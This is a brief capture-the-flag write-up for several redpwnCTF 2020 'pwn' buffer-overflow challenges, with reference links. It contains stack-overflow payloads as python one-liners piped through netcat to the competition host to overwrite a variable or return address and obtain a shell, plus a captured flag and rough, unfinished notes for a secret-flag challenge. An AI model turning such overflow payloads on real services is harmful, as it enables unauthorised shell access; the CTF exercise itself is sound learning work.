# pwn/coffer-overflow-0

[coffer-overflow-0.c](coffer-overflow-0.c)
[coffer-overflow-0](coffer-overflow-0)

```
Overflow input with more than 16 A will do
```

# pwn/coffer-overflow-1

[coffer-overflow-1.c](coffer-overflow-1.c)
[coffer-overflow-1](coffer-overflow-1)

References:

[JohnHammond](https://www.youtube.com/watch?v=yH8kzOkA_vw) |
[Radare2 Basics](https://radare.gitbooks.io/radare2book/debugger/getting_started.html) |
[Radare2 Input from stdin](https://reverseengineering.stackexchange.com/questions/21098/how-do-i-type-in-hex-input-into-radare2-debug-mode)

```
payload:
(python -c 'print("A"*24 + "\xbe\xba\xfe\xca")'; cat) | nc 2020.redpwnc.tf 31255

cat is needed in our payload because we need to capture shell. Watch video for more detail info
```

# pwn/coffer-overflow-2

References:

[Rardare2](https://gist.github.com/williballenthin/6857590dab3e2a6559d7)
[Address override](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)
[Stack frame](https://www.youtube.com/watch?v=75gBFiFtAb8)

```
address of binFunction 0x004006e6
need to override rbp base pointer

error after 23rd char

payload:
(python -c 'print("A"*24 + "\xe6\x06\x40\x00\x00")'; cat) | nc 2020.redpwnc.tf 31908

flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```

## pwn/secret-flag

```
AAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA


address that leaks data?
0x55ee991d5000

python -c 'print("A"*20 + "\x00\x50\x1d\x99\xee\x55")'
```
